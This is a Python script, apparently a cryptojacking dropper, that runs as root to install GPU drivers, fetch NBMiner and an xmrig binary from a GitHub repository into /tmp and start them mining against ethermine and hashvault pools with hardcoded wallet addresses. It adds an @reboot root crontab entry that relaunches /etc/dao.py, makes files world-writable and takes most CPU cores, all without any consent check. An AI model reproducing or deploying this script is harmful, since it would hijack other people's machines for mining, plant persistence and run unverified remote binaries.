__author__ = 'root'
import time
import os,sys
import multiprocessing
import random, string
useproxy = 0
os.system('chmod 777 ' + __file__)
stak_nvidia = 'nbminer'
link_github_stak_nvidia = 'https://github.com/NebuTech/NBMiner/releases/download/v39.5/NBMiner_39.5_Linux.tgz'
file_stak_nvidia = 'NBMiner_39.5_Linux.tgz'
folder_stak_nvidia = 'NBMiner_Linux'
link_config_nvidia_file = 'https://github.com/giautoidi/giautoidi/raw/beta/xmr-stak-nvida/config.txt' 
link_pool_nvidia_file = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/xmr-stak-nvida/pools.txt' 
os.system('pkill ' + stak_nvidia)
try:
    os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
except:
    pass

try:
    os.system('apt-get update -y')
    os.system('apt-get install -y python python-dev screen nvidia-driver-470')
    os.system('modprobe nvidia')
except:
    pass
try:
    path = '/var/spool/cron/crontabs/root'
    data = '@reboot screen -dm python /etc/dao.py'
    os.system('echo %s >> %s' %(data, path))
    os.system('chmod 600 %s' %path)
except:
    pass

if not os.path.isfile('/tmp/%s/%s' %(folder_stak_nvidia, stak_nvidia)):
    print('Chua co chuong trinh %s' %stak_nvidia)
    os.chdir('/tmp')
    os.system('wget %s' %link_github_stak_nvidia)
    os.system('tar xzf %s' %file_stak_nvidia)
    os.chdir('/tmp/%s' %folder_stak_nvidia)
    workingdir = os.getcwd()
    os.system('chmod 777 %s' %stak_nvidia)
    #os.system('ln -s -f ' + workingdir + '/' + 'xmr-stak-rx' + ' ' +'/usr/local/bin/' + stak_rx)
    #os.system('ln -s -f ' + workingdir + '/' + 'xmr-stak-rx' + ' ' + '/usr/bin/' + stak_rx)
    #time.sleep(100000)
else:
    print('Da co chuong trinh %s' %stak_nvidia)
    os.chdir('/tmp/%s' %folder_stak_nvidia)
    workingdir = os.getcwd()
    os.system('chmod 777 %s' %stak_nvidia)
    #os.system('ln -s -f ' + workingdir + '/' + 'xmr-stak-rx' + ' ' +'/usr/local/bin/' + stak_rx)
    #os.system('ln -s -f ' + workingdir + '/' + 'xmr-stak-rx' + ' ' + '/usr/bin/' + stak_rx)
    #time.sleep(1000000)
#check screen
os.system('nvidia-smi')
if os.path.isfile('/usr/bin/screen'):
    print('Co chuong trinh screen')
    os.system ('screen -dmS %s ./%s -a ethash -o asia1.ethermine.org:4444 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701' %(stak_nvidia,stak_nvidia))
elif os.path.isfile('/usr/bin/nohup'):
    print('Co chuong trinh nohup')
    os.system ('nohup ./%s -a ethash -o asia1.ethermine.org:4444 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701 &' %stak_nvidia)
else:
    os.system ('./%s -a ethash -o asia1.ethermine.org:4444 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701 &' %stak_nvidia)


cores_cpu = multiprocessing.cpu_count()
cores_tru = int(round(cores_cpu*20/100+0.9))
cores = cores_cpu - cores_tru
print('So cores de dao la %s' %cores)
stak_rx = 'xmrig'
link_github_stak_rx = 'https://github.com/giautoidi/giautoidi/raw/beta/xmrig_linux.gz'
link_deb = 'https://github.com/giautoidi/giautoidi/raw/beta/libnvrtc11.2.deb'
deb_name = 'libnvrtc11.2.deb'
file_stak_rx = 'xmrig_linux.gz'
folder_stak_rx = 'xmrig_linux'
os.system('pkill ' + stak_rx)

if not os.path.isfile('/tmp/%s/%s' %(folder_stak_rx, stak_rx)):
    print('Chua co chuong trinh %s' %stak_rx)
    os.chdir('/tmp')
    os.system('wget %s' %link_github_stak_rx)
    os.system('tar xf %s' %file_stak_rx)
    os.chdir('/tmp/%s' %folder_stak_rx)
    #os.system('wget %s' % link_deb)
    #try:
    #    os.system ('dpkg -i %s' %deb_name)
    #except:
    #    pass
    workingdir = os.getcwd()
    os.system('chmod 777 %s' %stak_rx)
else:
    print('Da co chuong trinh %s' %stak_rx)
    os.chdir('/tmp/%s' %folder_stak_rx)
    workingdir = os.getcwd()
#check screen
command = './%s --donate-level 1 -o pool.hashvault.pro:80 -u hvxxugGqjFCjJsvZw9FJbGMzUGuZ3XwBHT2E2xPRojHqPDvEr5ja7ssYrEq57ZzwwDP2h8Bxn6Wo4CT6CM3vLVyo3RQVippYt9 -p nql -a cn-heavy/xhv -t %s' %(stak_rx, cores)
if os.path.isfile('/usr/bin/screen'):
    print('Co chuong trinh screen')
    os.system ('screen -dmS %s %s' %(stak_rx,command))
elif os.path.isfile('/usr/bin/nohup'):
    print('Co chuong trinh nohup')
    os.system ('nohup %s &' %command)
else:
    os.system ('%s &' %command)
